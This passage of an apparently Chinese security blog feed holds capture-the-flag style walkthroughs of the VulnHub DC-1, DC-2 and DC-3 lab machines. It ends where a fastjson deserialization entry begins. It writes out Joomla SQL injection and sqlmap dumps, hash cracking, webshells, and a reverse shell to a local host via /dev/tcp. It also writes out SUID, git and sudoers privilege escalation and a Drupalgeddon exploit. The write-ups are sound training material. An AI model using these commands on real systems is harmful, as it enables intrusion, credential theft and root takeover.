alt="image-20220105191325430"></p><ol start="3"><li> /etc/sudoers把当前用户的权限给普通用户charles</li></ol><ul><li><p>  <code>%sudo ALL=(ALL:ALL)</code>这个字段，意思为sudo组下的所有用户都能使用sudo权限，前提需要执行用户本身的密码</p></li><li><p>  让test用户可以免密sudo执行所有命令<code>echo &quot;test ALL=(ALL:ALL)  NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</code></p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;charles ALL=(ALL:ALL) ALL&quot;</span> | sudo teehee -a /etc/sudoers<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC系列靶机第三篇</title>
    <link href="/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-3/"/>
    <url>/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  资源地址：<a href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a></p><p>  本机：192.168.3.15</p><p>  靶机：192.168.3.19</p></blockquote><h2 id="1-主机发现-amp-信息收集"><a href="#1-主机发现-amp-信息收集" class="headerlink" title="1. 主机发现&amp;信息收集"></a>1. 主机发现&amp;信息收集</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap 192.168.3.0/24<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1txd1h3aj30va07at9t.jpg" alt="image-20220104184427120"></p><p>首页面给我们了信息，“只有一个flag，需要提权到root”</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0hwug6j31ho0q0wh9.jpg" alt="image-20220104184529529"></p><p>可以发现web是旧梦</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0mhsqej30rg0pi0uy.jpg" alt="image-20220104184741179"></p><p>joomscan扫一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">joomscan -u <span class="hljs-string">&quot;http://192.168.3.19/&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vcgngk6j30dt0f1abf.jpg" alt="image-20220104190310570"></p><h2 id="2-漏洞测试-amp-利用"><a href="#2-漏洞测试-amp-利用" class="headerlink" title="2. 漏洞测试&amp;利用"></a>2. 漏洞测试&amp;利用</h2><h3 id="sql注入部分"><a href="#sql注入部分" class="headerlink" title="sql注入部分"></a>sql注入部分</h3><p>首先测试注入漏洞，搜索常见joomla漏洞测试即可，发现存在sql注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u886xtpj31ga0tc77o.jpg" alt="image-20220104185520424"></p><p>sqlmap一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 sqlmap.py -u <span class="hljs-string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=1&quot;</span> --dbs --batch<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vc8qpv5j316o0i6n1q.jpg" alt="image-20220104185451119"></p><p>跑出来了一些字段</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uof1e8oj31oq0t8ahf.jpg" alt="image-20220104191050990"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 sqlmap.py -u <span class="hljs-string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> -C <span class="hljs-string">&quot;id,email,name,password,params,params&quot;</span> --dump  -p <span class="hljs-string">&quot;list[fullordering]&quot;</span> --batch<br><br> 629 | freddy@norealaddress.net | admin | $2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> | &#123;<span class="hljs-string">&quot;admin_style&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;admin_language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;editor&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;helpsite&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;timezone&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ux5e1mvj31ev04jwg0.jpg" alt="image-20220104191420675"></p><h3 id="John破解hash"><a href="#John破解hash" class="headerlink" title="John破解hash"></a>John破解hash</h3><blockquote><p>  John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt<br>jhon dc-3hash.txt<br>破解得到密码snoopy<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" alt="image-20220104191915310"></p><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>后台地址：<a href="http://192.168.3.19/administrator/index.php">http://192.168.3.19/administrator/index.php</a></p><p>登陆进后台后有个php管理的模块，可以编辑php，写🐴。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1v5xif8xj31ds0u0454.jpg" alt="image-20220104192743224"></p><p>连接</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vbtz640j31ke0pg43a.jpg" alt="image-20220104193324139"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h2><p>发现了sudo ,但是sudo -l无果</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vdm1zknj31bk0rqgq0.jpg" alt="image-20220104193505048"></p><h3 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">uname</span> -a<br>lsb_release -a<br><span class="hljs-built_in">cat</span> /etc/issue<br><span class="hljs-built_in">cat</span> /proc/version<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvzjhetj31is08k0ur.jpg" alt="image-20220104194042884"></p><h3 id="搜索提权exp"><a href="#搜索提权exp" class="headerlink" title="搜索提权exp"></a>搜索提权exp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">searchsploit Ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvtm05sj30kp0c5797.jpg" alt="image-20220104202712344"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用39772：<a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a> ，上传后解压</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wuj3zcoj31720d8tcb.jpg" alt="image-20220104202556531"></p><p>反弹shell并执行脚本</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyen7mkj30dn05kt8x.jpg" alt="image-20220104202857994"></p><p>执行doubleput，flag在/root下</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyatfvzj30i90jljtp.jpg" alt="image-20220104202835076"></p><h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><ol><li> 搜索漏洞可以使用<strong>searchsploit</strong></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">searchsploit Ubuntu 16.04  <br></code></pre></td></tr></table></figure><ol start="2"><li> joomla漏洞扫描</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">joomscan -u <span class="hljs-string">&quot;http://192.168.3.19/&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1x7w3m4fj30ef0dy40d.jpg" alt="image-20220104203816491"></p><ol start="3"><li> John破解hash</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt<br>jhon dc-3hash.txt<br>破解得到密码snoopy<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" alt="image-20220104191915310"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC系列靶机第二篇</title>
    <link href="/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-2/"/>
    <url>/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-2/</url>
    
    <content type="html"><![CDATA[<p>终于闲下来了，继续搞一搞</p><blockquote><p>  资源地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p><p>  本机：192.168.3.15</p><p>  靶机：192.168.3.18</p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><p>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。</p><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netdiscover -i eth0 -r 192.168.3.0/24<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ady5ssrj30hu0e7ta2.jpg" alt="image-20220104055126098"></p><h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p>因为虚拟机出问题了ip换成18了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">masscan -p80 192.168.3.0/24<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae1abkcj30h803taak.jpg" alt="image-20220104061411939"></p><h2 id="2-漏洞发现利用"><a href="#2-漏洞发现利用" class="headerlink" title="2. 漏洞发现利用"></a>2. 漏洞发现利用</h2><p>访问发现了flag1，发现了提示“或许你可以尝试cewl”</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae4p213j30po0gmdgr.jpg" alt="image-20220104055509829"></p><h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">cewl dc-2 &gt; dc-2pwd.txt<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ae7zt6mj30he0bh3z2.jpg" alt="image-20220104062235864"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span>/ -e u<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aebrjlbj30hq09udhe.jpg" alt="image-20220104062201195"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wpscan --url http://dc-2/ -U dc-2user.txt -P dc-2pwd.txt <br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeeitndj30kp0epq66.jpg" alt="image-20220104062900271"></p><p>登陆jerry后发现flag2，可以使用其他办法</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xc1nsfj30gj0f874s.jpg" alt="image-20220104063042724"></p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh被拒绝了，后扫描发现7744端口开着</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo masscan --rate=10000 --port 0-65535 192.168.3.18 <br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xbcu8kj30gy04caat.jpg" alt="image-20220104063610583"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh -p 7744 tom@192.168.3.18 <span class="hljs-comment">#parturient</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy18xeazpaj30pj091mz6.jpg" alt="image-20220104063736520"></p><p>然后发现cat不能用，shell使用的rbash，可以使用vi读取文件，或者less也可。把常用的指令都试试就出了。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aend2n9j30rz02h0sv.jpg" alt="image-20220104070048688"></p><p>flag3提示“需要su登陆jerry”</p><h2 id="3-提权部分"><a href="#3-提权部分" class="headerlink" title="3. 提权部分"></a>3. 提权部分</h2><h3 id="突破rbash"><a href="#突破rbash" class="headerlink" title="突破rbash"></a>突破rbash</h3><p>可以使用vi突破限制，参考<a href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p><p>这里可以使用vi末行输入<code>setshell=/bin/bash 然后 shell</code>，但是cat仍然不可用，可以ls或者使用tab键找可以使用的指令</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aeqkja4j30rn0gjdj6.jpg" alt="image-20220104065805501"></p><p>为了使用su，必须把su到PATH环境变量，当然此时cat等命令也可以用了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> PATH=/usr/sbin:/usr/bin:/sbin:/bin<br>su jerry <span class="hljs-comment">#切换为jerry 密码:adipiscing</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aerxz8ej30qv0c7jtg.jpg" alt="image-20220104071132750"></p><p>通过cat获得jerry的flag4.txt，尝试提权发现可以用的(nmap、vim、find、bash、more、less、nano、cp)</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aexbp3uj30gh08z3zh.jpg" alt="image-20220104071329932"></p><h3 id="尝试less提权"><a href="#尝试less提权" class="headerlink" title="尝试less提权"></a>尝试less提权</h3><p>发现less并不是很行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">less /etc/passwd<br>!/bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1aezjgjzj30f6029dfv.jpg" alt="image-20220104071614282"></p><h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>阅读他人的文章发现git也是可以提权的</p><p>使用sudo -l可以找到git直接是root用户权限</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af1kvg8j30ty038gm4.jpg" alt="image-20220104071843646"></p><p>参考<a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p><p>提权方法如下</p><ol><li><p><code>sudo git help config</code>在末行命令模式输入 <code>!/bin/bash</code> 或<code> !&#39;sh&#39;</code> #完成提权 </p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af4qrvsj30as01qt8l.jpg" alt="image-20220104072223004"></p></li><li><p> <code>sudo git -p help</code>  #输入<code>!/bin/bash</code>，即可打开一个用户为root的shell</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1af7ecsaj30nh0ds778.jpg" alt="image-20220104072338489"></p><p>注意 : 想提权获得“末行命令模式输入”，尽量保证窗口小一些，使得回显信息不能一页显示，否则是不能输入的，像下面这样……</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afb80b5j30ng0fh77v.jpg" alt="image-20220104072530822"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在我们获得了root之后就可以拿到flag了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1afg4kigj30gf0aldgy.jpg" alt="image-20220104072725788"></p><h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ol><li><p> <code>sudo -l</code>可以查看root下的一些指令</p></li><li><p>suid提权，已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure></li><li><p>cewl可以爬取页面信息生成密码</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">cewl dc-2 &gt; dc-2pwd.txt<br></code></pre></td></tr></table></figure></li><li><p>wpscan这是一款Wordpress的专用扫描器</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">wpscan --url http://dc-2/ -e u   用户枚举<br>wpscan --url http://dc-2/ -U user.txt -P password.txt<br></code></pre></td></tr></table></figure><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1b30jj3fj30qo0e43z4.jpg" alt="image-20220104075255689"></p></li></ol><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>git提权：<a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p><p>rbash突破限制：<a href="https://cloud.tencent.com/developer/article/1680551">https://cloud.tencent.com/developer/article/1680551</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC系列靶机第一篇</title>
    <link href="/2022/01/02/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-1/"/>
    <url>/2022/01/02/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-1/</url>
    
    <content type="html"><![CDATA[<p>终于闲下来了，搞一搞</p><blockquote><p>  资源地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>  本机：192.168.3.15</p><p>  靶机：192.168.3.16</p></blockquote><h2 id="1-扫描网段发现主机"><a href="#1-扫描网段发现主机" class="headerlink" title="1. 扫描网段发现主机"></a>1. 扫描网段发现主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.3.0/24<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0rt76jj30jk05oq3l.jpg" alt="image-20220102201643698"></p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><blockquote><p>  Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。</p></blockquote><p>首页面</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0uwcxlj30hc0e1aaj.jpg" alt="image-20220102201715831"></p><p>版本相关</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzob3ez16j30bt0763yo.jpg" alt="image-20220102213340941"></p><h2 id="3-渗透"><a href="#3-渗透" class="headerlink" title="3.渗透"></a>3.渗透</h2><h3 id="3-1-目录扫描"><a href="#3-1-目录扫描" class="headerlink" title="3.1 目录扫描"></a>3.1 目录扫描</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0y24h1j30od0fz42e.jpg" alt="image-20220102203245812"></p><h3 id="3-2-msf"><a href="#3-2-msf" class="headerlink" title="3.2 msf"></a>3.2 msf</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">search drupal<br>use exploit/multi/http/drupal_drupageddon <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo12zx0uj30va0oagru.jpg" alt="image-20220102203746287"></p><p>执行shell拿到flag1，可知我们需要找配置文件</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo16oth3j30hy09i0ts.jpg" alt="image-20220102204210190"></p><p>写一句话后链接一下，找到数据库密码和flag2，并拿到提示“爆破和目录遍历并不是唯一拿到权限的方法”</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1asbz5j30lk0h80ty.jpg" alt="image-20220102205011742"></p><p>反弹shell执行sql，并不能进行破解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/bash -i &gt;&amp; /dev/tcp/192.168.3.15/4567 0&gt;&amp;1<br>mysql -udbuser -pR0ck3t -e &quot;show databases;&quot;<br>mysql -udbuser -pR0ck3t -e &quot;use drupaldb;select  * from users;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1e6lgaj30x203v753.jpg" alt="image-20220102205313820"></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1bzc1xj31db062di8.jpg" alt="image-20220102210756541"></p><p>尝试修改密码</p><p>参考：<a href="https://www.hankcs.com/program/drupal/reset-drupal-password.html">https://www.hankcs.com/program/drupal/reset-drupal-password.html</a></p><p>由于密文采用sha-512(不确定是不是)所以只需要更改密码为password对应的密文即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysql -udbuser -pR0ck3t -e &#x27;use drupaldb;select  * from users;update users set pass=&quot;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&quot; where name=&quot;admin&quot;;&#x27;<br></code></pre></td></tr></table></figure><p>使用admin/password登陆，得到flag3，提示要查看</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1gv2w9j30sv0b6wf7.jpg" alt="image-20220102212656725"></p><p>查看shadow和passwd，发现flag4，发现flag4用户有权限且信息存在/home/flag4</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1jhx4ij30kl0ggn0r.jpg" alt="image-20220102213654064"></p><p>拿到flag4，发现提示“你可以用同样的手法获得root下的flag吗”</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1m658bj30j607i3zk.jpg" alt="image-20220102213909473"></p><h3 id="3-3-提权部分"><a href="#3-3-提权部分" class="headerlink" title="3.3 提权部分"></a>3.3 提权部分</h3><blockquote><p>  SUID：Set User ID 是一种权限类型，允许用户使用指定用户的权限执行文件。SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件</p></blockquote><p>已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>尝试第一个发现find</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1rmp06j30ft0b1gmp.jpg" alt="image-20220102214349713"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -l /usr/bin/find<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1tzzaoj30hn01rmx8.jpg" alt="image-20220102214620132"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">find h3 -exec &quot;/bin/sh&quot; \; #使用find提权<br>cat /root/thefinalflag.txt<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1wyyn8j30hk09ggmq.jpg" alt="image-20220102214846546"></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在web提权到admin用户时除了使用sql的update改密码的方法可以使用目录下的sh文件进行获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php ./scripts/password-hash.sh 12345<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo78do6sj30rh05ggmv.jpg" alt="image-20220102215427332"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="/2021/09/30/javasec/fastjson%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/09/30/javasec/fastjson%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>本文学习一下fastjson漏洞</p><span id="more"></span><h2 id="Fastjson简单使用"><a href="#Fastjson简单使用" class="headerlink" title="Fastjson简单使用"></a>Fastjson简单使用</h2><p>先定义一个Student.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 